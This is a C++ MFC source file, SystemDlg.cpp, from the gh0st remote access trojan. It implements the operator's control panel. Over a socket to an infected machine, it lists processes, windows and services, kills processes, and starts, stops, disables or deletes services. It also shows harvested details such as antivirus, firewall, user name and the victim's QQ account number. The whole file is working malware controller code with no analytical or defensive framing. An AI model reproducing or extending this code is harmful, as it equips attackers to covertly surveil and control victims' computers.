// SystemDlg.cpp : implementation file
//
//#include <windows.h>
#include "stdafx.h"
#include "gh0st.h"
#include "SystemDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CSystemDlg dialog

CSystemDlg::CSystemDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialogEx(CSystemDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CSystemDlg)
	//}}AFX_DATA_INIT
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_SYSTEM));
}

void CSystemDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CSystemDlg)
	DDX_Control(pDX, IDC_LIST_SYSINFO, m_list_sysinfo);
	DDX_Control(pDX, IDC_LIST_SERVICE, m_list_Services);
	DDX_Control(pDX, IDC_LIST_WINDOWS, m_list_windows);
	DDX_Control(pDX, IDC_LIST_PROCESS, m_list_process);
	DDX_Control(pDX, IDC_TAB, m_tab);
	//}}AFX_DATA_MAP
}

void CSystemDlg::OnReceiveComplete()
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_PSLIST:
		ShowProcessList();
		break;
	case TOKEN_WSLIST:
		ShowWindowsList();
		break;
	case TOKEN_SVLIST:
		ShowServicesList();
		break;
	case TOKEN_SYSINFOLIST:
		ShowSysinfoList();
		break;
	default:
		// 传输发生异常数据
		break;
	}
}

BEGIN_MESSAGE_MAP(CSystemDlg, CDialogEx)
	//{{AFX_MSG_MAP(CSystemDlg)
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_NOTIFY(NM_RCLICK, IDC_LIST_SERVICE, OnRclickList)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_PROCESS, OnRclickList)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_WINDOWS, OnRclickList)
	ON_COMMAND(IDM_KILLPROCESS, OnKillprocess)
	ON_COMMAND(IDM_REFRESHPSLIST, OnRefreshPsList)
	ON_NOTIFY(TCN_SELCHANGE, IDC_TAB, OnSelchangeTab)

	ON_COMMAND(IDM_SERVICE_AUTOSTART, OnSetAuto)
	ON_COMMAND(IDM_SERVICE_DEMANDSTART, OnSetDemand)
	ON_COMMAND(IDM_SERVICE_DISABLE, OnSetDisable)
	ON_COMMAND(IDM_SERVICE_START, OnSetStart)
	ON_COMMAND(IDM_SERVICE_STOP, OnSetStop)
	ON_COMMAND(IDM_SERVICE_DELETE, OnSetDelete)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CSystemDlg message handlers

void CSystemDlg::ShowProcessList()
{
	BYTE *lpBuffer = m_pContext->m_DeCompressionBuffer.GetBuffer(1);
	DWORD dwOffset = 0;
	CString str;
	m_list_process.DeleteAllItems();

	int i;
	for (i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);
		TCHAR *strExeFile = (TCHAR*)(lpBuffer + dwOffset + sizeof(DWORD));
		TCHAR *strProcessName = (TCHAR*)(lpBuffer + dwOffset + sizeof(DWORD) + (lstrlen(strExeFile) + 1) * sizeof(TCHAR));

		m_list_process.InsertItem(i, strExeFile);
		str.Format(_T("%5u"), *lpPID);
		m_list_process.SetItemText(i, 1, str);
		m_list_process.SetItemText(i, 2, strProcessName);
		// ItemData 为进程ID
		m_list_process.SetItemData(i, *lpPID);

		dwOffset += sizeof(DWORD) + (lstrlen(strExeFile) + lstrlen(strProcessName) + 2) * sizeof(TCHAR);
	}

	str.Format(_T("程序路径 / %d"), i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_list_process.SetColumn(2, &lvc);
}

void CSystemDlg::ShowWindowsList()
{
	LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD dwOffset = 0;
	m_list_windows.DeleteAllItems();
	CString	str;
	int i;
	for (i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);
		TCHAR *lpTitle = (TCHAR *)(lpBuffer + dwOffset + sizeof(DWORD));
		str.Format(_T("%5u"), *lpPID);
		m_list_windows.InsertItem(i, str);
		m_list_windows.SetItemText(i, 1, lpTitle);
		// ItemData 为进程ID
		m_list_windows.SetItemData(i, *lpPID);
		dwOffset += sizeof(DWORD) + (lstrlen(lpTitle) + 1) * sizeof(TCHAR);
	}
	str.Format(_T("窗口名称 / %d"), i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_list_windows.SetColumn(1, &lvc);
}

void CSystemDlg::ShowServicesList()
{
	BYTE *lpBuffer = m_pContext->m_DeCompressionBuffer.GetBuffer(1);

	DWORD dwOffset = 0;
	CString str;
	m_list_Services.DeleteAllItems();

	int i;
	for (i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		TCHAR * szServiceName = (TCHAR*)(lpBuffer + dwOffset);
		TCHAR * szServicesDescri = (TCHAR*)(lpBuffer + dwOffset + (lstrlen(szServiceName) + 1) * sizeof(TCHAR));
		TCHAR * szDisplayName = (TCHAR*)(lpBuffer + dwOffset + (lstrlen(szServiceName) + lstrlen(szServicesDescri) + 2) * sizeof(TCHAR));
		LPDWORD dwRunState = LPDWORD(lpBuffer + dwOffset + (lstrlen(szServiceName) + lstrlen(szServicesDescri) + lstrlen(szDisplayName) + 3) * sizeof(TCHAR));
		LPDWORD dwStartType = LPDWORD(lpBuffer + dwOffset + (lstrlen(szServiceName) + lstrlen(szServicesDescri) + lstrlen(szDisplayName) + 3) * sizeof(TCHAR) + sizeof(DWORD));

		m_list_Services.InsertItem(i, szServiceName);
		m_list_Services.SetItemText(i, 1, szDisplayName);
		m_list_Services.SetItemText(i, 2, szServicesDescri);
		CString strItem = FormatServiceState(*dwRunState);
		m_list_Services.SetItemText(i, 3, strItem);
		strItem = FormatServiceStartType(*dwStartType);
		m_list_Services.SetItemText(i, 4, strItem);

		dwOffset += sizeof(DWORD) + sizeof(DWORD) + (lstrlen(szServiceName) + lstrlen(szDisplayName) + lstrlen(szServicesDescri) + 3) * sizeof(TCHAR);
	}

	str.Format(_T("服务名称 / %d"), i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_list_Services.SetColumn(0, &lvc);
}

#define SERVICE_STOPPED                        0x00000001
#define SERVICE_START_PENDING                  0x00000002
#define SERVICE_STOP_PENDING                   0x00000003
#define SERVICE_RUNNING                        0x00000004
#define SERVICE_CONTINUE_PENDING               0x00000005
#define SERVICE_PAUSE_PENDING                  0x00000006
#define SERVICE_PAUSED                         0x00000007

CString CSystemDlg::FormatServiceState(DWORD dwRunState)
{
	CString strState;
	switch (dwRunState)
	{
	case 0x00000001://SERVICE_STOPPED
		strState = _T("已停止");
		break;
	case 0x00000002://SERVICE_START_PENDING
		strState = _T("启动挂起");
		break;
	case 0x00000003://SERVICE_STOP_PENDING
		strState = _T("停止挂起");
		break;
	case 0x00000004://SERVICE_RUNNING
		strState = _T("运行中");
		break;
	case 0x00000005://SERVICE_CONTINUE_PENDING
		strState = _T("继续挂起");
		break;
	case 0x00000006://SERVICE_PAUSE_PENDING
		strState = _T("暂停挂起");
		break;
	case 0x00000007://SERVICE_PAUSED
		strState = _T("已暂停");
		break;
	default:
		strState = _T("未知状态");
		break;
	}

	return strState;
}

CString CSystemDlg::FormatServiceStartType(DWORD dwStartType)
{
	CString strType;

	switch (dwStartType)
	{
	case SERVICE_AUTO_START:
		strType = _T("自动");
		break;
	case SERVICE_DISABLED:
		strType = _T("禁用");
		break;
	case SERVICE_DEMAND_START:
		strType = _T("手动");
		break;
	case SERVICE_SYSTEM_START:
	case SERVICE_BOOT_START:
		strType = _T("系统");
		break;
	default:
		strType = _T("未知类型");
		break;
	}

	return strType;
}

BOOL CSystemDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	CString temp = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
	str.Format(_T("\\\\%s - 系统管理"), temp);
	SetWindowText(str);

	m_tab.InsertItem(0, _T("进程管理"));
	m_tab.InsertItem(1, _T("窗口管理"));
	m_tab.InsertItem(2, _T("服务管理"));
	m_tab.InsertItem(3, _T("系统信息"));

	m_list_process.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT
		| LVS_EX_HEADERDRAGDROP
		| LVS_EX_ONECLICKACTIVATE
		| LVS_EX_GRIDLINES);

	m_list_process.InsertColumn(0, _T("映像名称"), LVCFMT_LEFT, 120);
	m_list_process.InsertColumn(1, _T("PID"), LVCFMT_LEFT, 50);
	m_list_process.InsertColumn(2, _T("程序路径"), LVCFMT_LEFT, 463);

	m_list_windows.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT
		| LVS_EX_HEADERDRAGDROP
		| LVS_EX_ONECLICKACTIVATE
		| LVS_EX_GRIDLINES);

	m_list_windows.InsertColumn(0, _T("PID"), LVCFMT_LEFT, 50);
	m_list_windows.InsertColumn(1, _T("窗口名称"), LVCFMT_LEFT, 583);

	m_list_Services.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT
		| LVS_EX_HEADERDRAGDROP
		| LVS_EX_ONECLICKACTIVATE
		| LVS_EX_GRIDLINES);

	m_list_Services.InsertColumn(0, _T("服务名称"), LVCFMT_LEFT, 110);
	m_list_Services.InsertColumn(1, _T("显示名称"), LVCFMT_LEFT, 70);
	m_list_Services.InsertColumn(2, _T("服务描述"), LVCFMT_LEFT, 310);
	m_list_Services.InsertColumn(3, _T("状态"), LVCFMT_LEFT, 55);
	m_list_Services.InsertColumn(4, _T("启动类型"), LVCFMT_LEFT, 70);

	m_list_sysinfo.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT
		| LVS_EX_HEADERDRAGDROP
		| LVS_EX_ONECLICKACTIVATE
		| LVS_EX_GRIDLINES);

	m_list_sysinfo.InsertColumn(0, _T("属性"), LVCFMT_LEFT, 100);
	m_list_sysinfo.InsertColumn(1, _T("内容"), LVCFMT_LEFT, 533);

	AdjustList();
	ShowProcessList();
	ShowSelectWindow();

	return TRUE;  // return TRUE unless you set the focus to a control
	// EXCEPTION: OCX Property Pages should return FALSE
}

BOOL CSystemDlg::PreTranslateMessage(MSG* pMsg)
{
	if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE))
	{
		return true;
	}
	return CDialogEx::PreTranslateMessage(pMsg);
}

void CSystemDlg::OnClose()
{
	//	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);
	CDialogEx::OnClose();
}

void CSystemDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	AdjustList();
}

void CSystemDlg::AdjustList()
{
	RECT	rectClient;
	RECT	rectList;
	GetClientRect(&rectClient);
	rectList.left = 0;
	rectList.top = 29;
	rectList.right = rectClient.right;
	rectList.bottom = rectClient.bottom;

	if (IsWindow(m_list_process)) m_list_process.MoveWindow(&rectList);
	if (IsWindow(m_list_windows)) m_list_windows.MoveWindow(&rectList);
	if (IsWindow(m_list_Services)) m_list_Services.MoveWindow(&rectList);
	if (IsWindow(m_list_sysinfo)) m_list_sysinfo.MoveWindow(&rectList);
	//	m_list_process.SetColumnWidth(2, rectList.right - m_list_process.GetColumnWidth(0) - m_list_process.GetColumnWidth(1) - 20);
}

void CSystemDlg::ShowSelectWindow()
{
	switch (m_tab.GetCurSel())
	{
	case 0:
		m_list_windows.ShowWindow(SW_HIDE);
		m_list_process.ShowWindow(SW_SHOW);
		m_list_Services.ShowWindow(SW_HIDE);
		m_list_sysinfo.ShowWindow(SW_HIDE);
		if (m_list_process.GetItemCount() == 0)
			GetProcessList();
		break;
	case 1:
		m_list_windows.ShowWindow(SW_SHOW);
		m_list_process.ShowWindow(SW_HIDE);
		m_list_Services.ShowWindow(SW_HIDE);
		m_list_sysinfo.ShowWindow(SW_HIDE);
		if (m_list_windows.GetItemCount() == 0)
			GetWindowsList();
		break;

	case 2:
		m_list_windows.ShowWindow(SW_HIDE);
		m_list_process.ShowWindow(SW_HIDE);
		m_list_Services.ShowWindow(SW_SHOW);
		m_list_sysinfo.ShowWindow(SW_HIDE);
		if (m_list_Services.GetItemCount() == 0)
			GetServicesList();
		break;
	case 3:
		m_list_windows.ShowWindow(SW_HIDE);
		m_list_process.ShowWindow(SW_HIDE);
		m_list_Services.ShowWindow(SW_HIDE);
		m_list_sysinfo.ShowWindow(SW_SHOW);
		if (m_list_sysinfo.GetItemCount() == 0)
			GetSysinfoList();
		break;
	default: ;
	}
}

void CSystemDlg::OnRclickList(NMHDR* pNMHDR, LRESULT* pResult)
{
	// TODO: Add your control notification handler code here
	if (m_list_Services.IsWindowVisible())
	{
		OnRclickServicesList();
		return;
	}

	CMenu	popup;
	popup.LoadMenu(IDR_PSLIST);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);

	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
	*pResult = 0;
}

void CSystemDlg::OnRclickServicesList()
{
	//	if (m_list_Services.IsWindowVisible())
	//		OnRclickServicesList();
	//		return;

	CMenu	popup;
	popup.LoadMenu(IDR_SERVICES);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);

	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
	//	*pResult = 0;
}

void CSystemDlg::OnKillprocess()
{
	CListCtrl	*pListCtrl;
	if (m_list_process.IsWindowVisible())
		pListCtrl = &m_list_process;
	else if (m_list_windows.IsWindowVisible())
		pListCtrl = &m_list_windows;
	else
		return;

	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1 + (pListCtrl->GetSelectedCount() * 4));
	lpBuffer[0] = COMMAND_KILLPROCESS;

	CString str;
	if (pListCtrl->GetSelectedCount() > 1)
	{
		str.Format(_T("确实\n想终止这%d项进程吗?"), pListCtrl->GetSelectedCount());
	}
	else
	{
		str.Format(_T("确实\n想终止该项进程吗?"));
	}
	if (::MessageBox(m_hWnd, str, _T("警告"), MB_YESNO | MB_ICONQUESTION) == IDNO)
		return;

	DWORD	dwOffset = 1;
	POSITION pos = pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl

	while (pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = pListCtrl->GetNextSelectedItem(pos);
		DWORD dwProcessID = pListCtrl->GetItemData(nItem);
		memcpy(lpBuffer + dwOffset, &dwProcessID, sizeof(DWORD));
		dwOffset += sizeof(DWORD);
	}
	m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemDlg::OnRefreshPsList()
{
	// TODO: Add your command handler code here
	if (m_list_process.IsWindowVisible())
		GetProcessList();
	if (m_list_windows.IsWindowVisible())
		GetWindowsList();
	if (m_list_Services.IsWindowVisible())
		GetServicesList();
	if (m_list_sysinfo.IsWindowVisible())
		GetSysinfoList();
}

void CSystemDlg::GetProcessList()
{
	BYTE bToken = COMMAND_PSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSystemDlg::GetWindowsList()
{
	BYTE bToken = COMMAND_WSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSystemDlg::GetServicesList()
{
	BYTE bToken = COMMAND_SVLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSystemDlg::GetSysinfoList()
{
	BYTE bToken = COMMAND_SYSINFOLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSystemDlg::OnSelchangeTab(NMHDR* pNMHDR, LRESULT* pResult)
{
	// TODO: Add your control notification handler code here
	ShowSelectWindow();
	*pResult = 0;
}

void CSystemDlg::OnSetAuto()
{
	CListCtrl *pListCtrl = &m_list_Services;

	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 200);
	DWORD	dwOffset = 1;
	TCHAR	lpServiceName[128];

	lpBuffer[0] = COMMAND_SERVICE_AUTOSTART;

	int x = pListCtrl->GetSelectionMark();
	pListCtrl->GetItemText(x, 0, lpServiceName, 128);

	memcpy(lpBuffer + dwOffset, (TCHAR*)lpServiceName, (lstrlen(lpServiceName) + 1) * sizeof(TCHAR));
	m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemDlg::OnSetDemand()
{
	CListCtrl *pListCtrl = &m_list_Services;

	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 200);
	DWORD	dwOffset = 1;
	TCHAR	lpServiceName[128];

	lpBuffer[0] = COMMAND_SERVICE_DEMANDSTART;

	int x = pListCtrl->GetSelectionMark();
	pListCtrl->GetItemText(x, 0, lpServiceName, 128);

	memcpy(lpBuffer + dwOffset, (TCHAR*)lpServiceName, (lstrlen(lpServiceName) + 1) * sizeof(TCHAR));
	m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemDlg::OnSetDisable()
{
	CListCtrl	*pListCtrl = &m_list_Services;

	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 200);
	DWORD	dwOffset = 1;
	TCHAR	lpServiceName[128];

	lpBuffer[0] = COMMAND_SERVICE_DISABLE;

	int x = pListCtrl->GetSelectionMark();
	pListCtrl->GetItemText(x, 0, lpServiceName, 128);

	memcpy(lpBuffer + dwOffset, (TCHAR*)lpServiceName, (lstrlen(lpServiceName) + 1) * sizeof(TCHAR));
	m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemDlg::OnSetDelete()
{
	CListCtrl	*pListCtrl = &m_list_Services;

	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 200);
	DWORD	dwOffset = 1;
	TCHAR	lpServiceName[128];

	lpBuffer[0] = COMMAND_SERVICE_DELETE;

	int x = pListCtrl->GetSelectionMark();
	pListCtrl->GetItemText(x, 0, lpServiceName, 128);

	memcpy(lpBuffer + dwOffset, (TCHAR*)lpServiceName, (lstrlen(lpServiceName) + 1) * sizeof(TCHAR));
	m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemDlg::OnSetStart()
{
	CListCtrl	*pListCtrl = &m_list_Services;

	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 200);
	DWORD	dwOffset = 1;
	TCHAR	lpServiceName[128];

	lpBuffer[0] = COMMAND_SERVICE_START;

	int x = pListCtrl->GetSelectionMark();
	pListCtrl->GetItemText(x, 0, lpServiceName, 128);

	memcpy(lpBuffer + dwOffset, (TCHAR*)lpServiceName, (lstrlen(lpServiceName) + 1) * sizeof(TCHAR));
	m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemDlg::OnSetStop()
{
	CListCtrl	*pListCtrl = &m_list_Services;

	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 200);
	DWORD	dwOffset = 1;
	TCHAR	lpServiceName[128];

	lpBuffer[0] = COMMAND_SERVICE_STOP;

	int x = pListCtrl->GetSelectionMark();
	pListCtrl->GetItemText(x, 0, lpServiceName, 128);

	memcpy(lpBuffer + dwOffset, (TCHAR*)lpServiceName, (lstrlen(lpServiceName) + 1) * sizeof(TCHAR));
	m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

/////////////////////////////////////////////////////////
void CSystemDlg::ShowSysinfoList()
{
	LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	tagSystemInfo m_SysInfo;
	memcpy(&m_SysInfo, lpBuffer, sizeof(tagSystemInfo));

	OutputDebugString(m_SysInfo.szSystem);

	m_list_sysinfo.SetRedraw(FALSE);//禁止闪烁
	m_list_sysinfo.DeleteAllItems();

	m_list_sysinfo.InsertItem(0, _T("操作系统"), 0);
	m_list_sysinfo.InsertItem(1, _T("CPU信息"), 1);
	m_list_sysinfo.InsertItem(2, _T("内存大小"), 2);
	m_list_sysinfo.InsertItem(3, _T("活动时间"), 3);
	m_list_sysinfo.InsertItem(4, _T("空闲时间"), 4);
	m_list_sysinfo.InsertItem(5, _T("杀毒软件"), 5);
	m_list_sysinfo.InsertItem(6, _T("防火墙"), 6);
	m_list_sysinfo.InsertItem(7, _T("计算机名称"), 7);
	m_list_sysinfo.InsertItem(8, _T("当前用户"), 8);
	m_list_sysinfo.InsertItem(9, _T("屏幕分辨率"), 9);
	m_list_sysinfo.InsertItem(10, _T("硬盘大小"), 10);
	m_list_sysinfo.InsertItem(11, _T("当前QQ号码"), 11);
	m_list_sysinfo.SetItemText(0, 1, m_SysInfo.szSystem);
	m_list_sysinfo.SetItemText(1, 1, m_SysInfo.szCpuInfo);
	m_list_sysinfo.SetItemText(2, 1, m_SysInfo.szMemory);
	m_list_sysinfo.SetItemText(3, 1, m_SysInfo.szActiveTime);
	m_list_sysinfo.SetItemText(4, 1, m_SysInfo.szIdleTime);
	m_list_sysinfo.SetItemText(5, 1, m_SysInfo.szAntiVirus);
	m_list_sysinfo.SetItemText(6, 1, m_SysInfo.szFireWall);
	m_list_sysinfo.SetItemText(7, 1, m_SysInfo.szPcName);
	m_list_sysinfo.SetItemText(8, 1, m_SysInfo.szUserName);
	m_list_sysinfo.SetItemText(9, 1, m_SysInfo.szScrSize);
	m_list_sysinfo.SetItemText(10, 1, m_SysInfo.szDriveSize);
	m_list_sysinfo.SetItemText(11, 1, m_SysInfo.szQqNum);

	//更新窗口
	m_list_sysinfo.SetRedraw(TRUE);
	m_list_sysinfo.Invalidate();
	m_list_sysinfo.UpdateWindow();
}